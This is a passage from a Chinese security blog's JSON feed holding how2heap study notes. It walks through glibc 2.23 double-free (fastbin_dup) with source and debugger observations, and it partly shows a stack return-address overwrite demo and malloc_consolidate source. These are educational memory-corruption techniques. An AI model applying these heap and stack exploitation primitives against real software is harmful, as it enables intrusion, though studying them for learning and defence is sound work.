内建函数，得到栈的 ret 地址</span></pre></td></tr></table></figure><p>这里就开始进行改写了，直接将栈上的 ret 改写，绕过了 canary 保护</p>\n<p>这里将 buffer1 的 ret 改写为 sc（也就是 jackpot 的地址），就会 ret 去执行这里导致输出 jackpot 函数的 <code>Nice jump d00d</code></p>\n<p>查看 jackpot 地址：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/S_D4M%28NMW%7B%7EX%5B8IO012T%7BDC.png\" alt=\"\" /></p>\n<p>执行 <code>memcpy((p4+offset+8), &amp;sc, 8);</code>  查看栈上：<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/ML%5D%7E%7BM%253N%24U3%294SLV%25UR6C6.png\" alt=\"\" /></p>\n<p>执行最后的  <code>assert((long)__builtin_return_address(0) == (long)jackpot);</code>  判断成功</p>\n<p>最后会返回到 <code>jackpot</code>  输出 <code>Nice jump d00d</code></p>\n<h1 id=\"8house_of_mind_fastbin又是一个坑\"><a class=\"anchor\" href=\"#8house_of_mind_fastbin又是一个坑\">#</a> 8. <code>house_of_mind_fastbin</code> 【又是一个坑】</h1>\n<h1 id=\"9house_of_orange\"><a class=\"anchor\" href=\"#9house_of_orange\">#</a> 9. <code>house_of_orange</code></h1>\n<h2 id=\"1源码\"><a class=\"anchor\" href=\"#1源码\">#</a> 1. 源码</h2>\n<pre><code class=\"language-c\">\n\n\n</code></pre>\n",
            "tags": [
                "how2heap"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap/",
            "url": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap/",
            "title": "how2heap",
            "date_published": "2023-10-19T11:23:15.000Z",
            "content_html": "<h1 id=\"编译及链接\"><a class=\"anchor\" href=\"#编译及链接\">#</a> 编译及链接</h1>\n<h2 id=\"首先安装对应glibc版本\"><a class=\"anchor\" href=\"#首先安装对应glibc版本\">#</a> 首先安装对应 glibc 版本</h2>\n<p><code>./download 2.23-0ubuntu3_amd64</code></p>\n<h2 id=\"编译程序\"><a class=\"anchor\" href=\"#编译程序\">#</a> 编译程序</h2>\n<p><code>gcc  -g -no-pie fastbin_dup.c -o fastbin_dup</code></p>\n<p>【这里 - g 是可以根据代码对应的行数来下断点】</p>\n<h2 id=\"链接对应版本的glibc库\"><a class=\"anchor\" href=\"#链接对应版本的glibc库\">#</a> 链接对应版本的 glibc 库</h2>\n<p>22.04</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-rpath /home/pwn/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ fastbin_dup </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-interpreter /home/pwn/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 fastbin_dup</pre></td></tr></table></figure><p>编译完后运行程序，发现报错：</p>\n<pre><code>/home/pwn/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6: version `GLIBC_2.34' not found (required by /home/pwn/Desktop/how2heap/how2heap-master/glibc_2.23/fastbin_dup)\n</code></pre>\n<p>貌似 gcc 是高版本的问题而 glibc 是低版本，手动编译</p>\n<p><code>sudo wget http://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz</code></p>\n<p><s>然后。。发现 how2heap 提供了编译，直接 <code>make clean all</code>  就能根据对应的 <code>glibc</code>  编译全部程序</s></p>\n<p>18.04</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-rpath /home/ctfshow/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ fastbin_dup</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> patchelf --set-interpreter /home/ctfshow/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so fastbin_dup</pre></td></tr></table></figure><p>这个就没有报错</p>\n<h1 id=\"bin的大小及合并\"><a class=\"anchor\" href=\"#bin的大小及合并\">#</a> bin 的大小及合并：</h1>\n<h2 id=\"fast-bin\"><a class=\"anchor\" href=\"#fast-bin\">#</a> fast bin</h2>\n<pre><code>从0x20到0x80(64位,大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员)，且在放进fsatbin中不会进行合并也就是他的prev_insuer一直为零\n</code></pre>\n<p>合并时机：</p>\n<p>fastbin 会在以下情况下进行合并（合并是对所有 fastbin 中的 chunk 而言）。<br />\nmalloc：</p>\n<ol>\n<li>在申请 large chunk 时。</li>\n<li>当申请的 chunk 需要申请新的 top chunk 时。<br />\nfree：</li>\n<li>free 的堆块大小大于 fastbin 中的最大 size。（注意这里并不是指当前 fastbin 中最大 chunk 的 size，而是指 fastbin 中所定义的最大 chunk 的 size，是一个固定值。）</li>\n</ol>\n<p>另外：malloc_consolidate 既可以作为 fastbin 的初始化函数，也可以作为 fastbin 的合并函数。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjU3NzQyLmh0bQ==\">https://bbs.kanxue.com/thread-257742.htm</span></p>\n<h2 id=\"smallbin\"><a class=\"anchor\" href=\"#smallbin\">#</a> smallbin</h2>\n<pre><code>小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的。\n\nsmall bin链表的个数为62个。\n\n就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。\n</code></pre>\n<p>合并操作：</p>\n<p>相邻的 free chunk 需要进行合并操作，即合并成一个大的 free chunk</p>\n<p>free 操作</p>\n<pre><code>small的free比较特殊。当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中，之后unsorted bin进行整理再添加到对应的bin链上（后面会有图介绍）。\n</code></pre>\n<h2 id=\"largebin\"><a class=\"anchor\" href=\"#largebin\">#</a> largebin</h2>\n<pre><code>大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的。\n\nlarge bin链表的个数为63个，被分为6组。\n\nlargechunk使用fd_nextsize、bk_nextsize连接起来的。\n</code></pre>\n<p>合并操作：类似于 small bin</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdHJ1bmsvcC8xNjg2MzE4NS5odG1s\">https://www.cnblogs.com/trunk/p/16863185.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1L2FydGljbGUvZGV0YWlscy85Njg2NTMyMQ==\">https://blog.csdn.net/qq_41453285/article/details/96865321</span></p>\n<h1 id=\"1fastbin_dupc\"><a class=\"anchor\" href=\"#1fastbin_dupc\">#</a> 1. <code>fastbin_dup.c</code></h1>\n<p>介绍了 double free 的漏洞，再 free 后指针没有被置空的情况，可以再次释放，导致我们后面申请的两次堆块可以指向同一个 chunk 进行利用</p>\n<h2 id=\"1源码\"><a class=\"anchor\" href=\"#1源码\">#</a> 1. 源码：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This file demonstrates a simple double-free attack with fastbins.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating 3 buffers.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>b <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the first one...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"If we free %p again, things will crash because %p is at the top of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token comment\">// free(a);</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"So, instead, we'll free %p.\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can free %p again, since it's not the head of the free list.\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\ta <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tb <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tc <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1st malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2nd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3rd malloc(8): %p\\n\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"2调试程序\"><a class=\"anchor\" href=\"#2调试程序\">#</a> 2. 调试程序</h2>\n<h3 id=\"执行前18行后查看堆情况\"><a class=\"anchor\" href=\"#执行前18行后查看堆情况\">#</a> 执行前 18 行后，查看堆情况</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/A2M%7EC%7B8YU2IDD8VI45Y44XM.png\" alt=\"\" /></p>\n<h3 id=\"执行第19行\"><a class=\"anchor\" href=\"#执行第19行\">#</a> 执行第 19 行：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以从下面看到 <code> chunk a</code>  已经进入 <code>fastbin</code> ，然后此时 <code>fastbin</code>  只有他一个，并且是第一个进入的，所以 fd 为 0</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/J7%24SE7D%7DVSAXC3%7EO%7DF%60T%24%29H.png\" alt=\"\" /></p>\n<h3 id=\"再执行到25行freeb\"><a class=\"anchor\" href=\"#再执行到25行freeb\">#</a> 再执行到 25 行 <code>free(b)</code></h3>\n<p>可以发现，释放的 <code>chunk b</code>  fd 指向了前面释放的 <code>chunk a</code> ，这里是由于 fastbin 的后进先出的由于， <code>fastbin-&gt;新释放的chunk-&gt;上一个释放的chunk</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%7E%4097B%60%7DQ53%5BB%254EK%40Y%40RRFH.png\" alt=\"\" /></p>\n<h3 id=\"执行第28行freea\"><a class=\"anchor\" href=\"#执行第28行freea\">#</a> 执行第 28 行 <code>free(a)</code></h3>\n<p>这里就发现了，将已经释放过的 chunk a 再次释放，就会导致被再次添加到 fastbin 中（原本 a 第一次进入 fastbin 中没有改变 chunk 的结构），所以会被当作新释放的 chunk 来放入 fastbin</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/0XQ25GYB%40VN2%25HUB6K%40F%24JT.png\" alt=\"\" /></p>\n<h4 id=\"这里其实有个隐藏的问题为什么不直接连续释放两次chunk-a\"><a class=\"anchor\" href=\"#这里其实有个隐藏的问题为什么不直接连续释放两次chunk-a\">#</a> 这里其实有个隐藏的问题：为什么不直接连续释放两次 chunk a？</h4>\n<pre><code>这里会有一个检测，指向新释放的chunk是main_arena(我写他为fastbin很便于理解)，再释放的时候仅仅验证了main_arena指向的chunk，第一次释放chunk a后，main_arena会指向chuank a，那么紧接着再次释放chunk a，会被通过检测main_arena指向的chunk给识别出来，导致错误\n\n这里在glibc2.23源码是：3935行\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>old <span class=\"token operator\">==</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//if you release the same address twice，就报错 double free 错误</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t    errstr <span class=\"token operator\">=</span> <span class=\"token string\">\"double free or corruption (fasttop)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t    <span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>glibc2.23 对于 double free 的管理非常地松散，如果连续释放相同 chunk 的时候，会报错，但是如果隔块释放的话，就没有问题。在 glibc2.27 及以后的 glibc 版本中，加入了 tcache 机制，加强了对 use after free 的检测，所以 glibc2.23 中针对 fastbin 的 uaf 在 glibc2.27 以后，就失效了</p>\n<p>此时 fastbin 中的结构是：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/WF329P8%5D2Q%5BJ%7DQDT%7E%28J7V0D.png\" alt=\"\" /></p>\n<p><code>fastbin-&gt;chunk a(新释放的)-&gt;chunk b-&gt;chunk a</code> 【fastbin 是单项链表】</p>\n<h3 id=\"执行到第31行\"><a class=\"anchor\" href=\"#执行到第31行\">#</a> 执行到第 31 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>查看堆情况：</p>\n<p>看起来和没有执行 <code>a=malloc(8)</code>  一样：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/_%60XZL5C%40%7E8SL2S3Z%5D1TIPWY.png\" alt=\"\" /></p>\n<p>但是查看 fastbin 就有区别了：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/2JQ%280MU7%24T%7B%28%29MO3S917%7D7S.png\" alt=\"\" /></p>\n<p>现在变成了 <code>fastbin-&gt;chunk b-&gt;chunk a</code></p>\n<h3 id=\"执行32行b-malloc8\"><a class=\"anchor\" href=\"#执行32行b-malloc8\">#</a> 执行 32 行 <code>b = malloc(8);</code></h3>\n<p>这里已经摘除 chunk b, 所以 fastbin 指向了 chunk a，而这里又发现 chunk a 又指向了 chunk b，初步认为是在前面 malloc (a), 没有将 fd 置空，</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/74H%7D%29PY8UZ%286_720HNY8G1W.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/R%24L90CG5%60%251B937WEQ%5D_UQY.png\" alt=\"\" /></p>\n<h3 id=\"执行33行cmalloc8\"><a class=\"anchor\" href=\"#执行33行cmalloc8\">#</a> 执行 33 行 <code>c=malloc(8)</code></h3>\n<p>这里符合猜想，a、b 两个 chunk 的 fd 互相指向对方，而切再申请后没有清空，就导致了无限循环</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/M%40X%60I%29B23F1UD%7EQE%5B03%5D%7DJV.png\" alt=\"\" /></p>\n<p>接下来仍然和之前一样：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/%28VOQZ1FQ%5DC5M6OBQD7E%29%296G.png\" alt=\"\" /></p>\n<h3 id=\"执行到程序结束\"><a class=\"anchor\" href=\"#执行到程序结束\">#</a> 执行到程序结束</h3>\n<p>程序运行结果：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/%5DYUNR9PY%29S%60%254EU%7E15%7E_N91.png\" alt=\"\" /></p>\n<p>这里也符合预期，第一次和第三次指向同一个 chun a</p>\n<p>注意【 <code>fastbin链表的存放的chunk头指针，都存储在堆中名为arena的空间的，直接用dq &amp;main_arena 20查看</code> 】</p>\n<h1 id=\"2fastbin_dup_consolidate\"><a class=\"anchor\" href=\"#2fastbin_dup_consolidate\">#</a> 2. <code>fastbin_dup_consolidate</code></h1>\n<p>介绍了 double free 的合并行为，在 <code>fastbin</code>  不为空时申请一个 <code>largebin</code>  会使这个 fastbin 进行合并（这里与 top chunk 合并，并且直接释放满足 fastbin 的 chunk 是不会与 <code>top chunk</code>  合并的），指针没有被置空的情况，可以利用前面释放的指针再次释放第二次申请的指针，导致我们第首次申请时，三个指针指向同一个 chunk</p>\n<p>这个漏洞，使得我们可以通过其他的指针来修改同一个 chunk 从而被我们利用（或许可以绕过某些检测）</p>\n<h2 id=\"利用mallocconsolidate函数\"><a class=\"anchor\" href=\"#利用mallocconsolidate函数\">#</a> 利用 malloc.consolidate 函数</h2>\n<p>glibc2.23 源码 (4108-4218 行)：</p>\n<p>在 glibc2.23 中当 fasbin 中有 chunk 存在，申请一个 largebin 范围的 chunk，就执行该函数（再 <code>_int_malloc()</code>  3447 行会再分配 largebin 时执行该函数，会将 fastbin 先看该 chunk 是否紧挨着 <code>top chunk</code>  不紧挨着就转移到 <code>unsortedbin</code>  中，malloc 函数会在 unsortedbin 查询符合大小的 chunk，发现新转移来的 chunk，判断这些 chunk 是否符合 smallbin 的大小，如果符合 smallbin，就加入到 smallbin 中，否则就到 largebin 中</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  ------------------------- malloc_consolidate -------------------------</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  malloc_consolidate is a specialized version of free() that tears</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  down chunks held in fastbins.  Free itself cannot be used for this</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  purpose since, among other things, it might place chunks back onto</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  fastbins.  So, instead, we need to use a minor variant of the same</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  code.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  Also, because this routine needs to be called the first time through</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  malloc anyway, it turns out to be the perfect place to trigger</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  initialization code.</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* current fastbin being consolidated */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  mfastbinptr<span class=\"token operator\">*</span>    maxfb<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* last fastbin (for loop control) */</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  mchunkptr       p<span class=\"token punctuation\">;</span>                  <span class=\"token comment\">/* current chunk being consolidated */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  mchunkptr       nextp<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* next chunk to consolidate */</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  mchunkptr       unsorted_bin<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* bin header */</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  mchunkptr       first_unsorted<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* chunk to link to */</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\">/* These have same use as in free() */</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  mchunkptr       nextchunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  INTERNAL_SIZE_T nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  INTERNAL_SIZE_T prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">int</span>             nextinuse<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  mchunkptr       bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  mchunkptr       fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    If max_fast is 0, we know that av hasn't</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    yet been initialized, in which case do so below</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  */</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">get_max_fast</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token function\">clear_fastchunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token 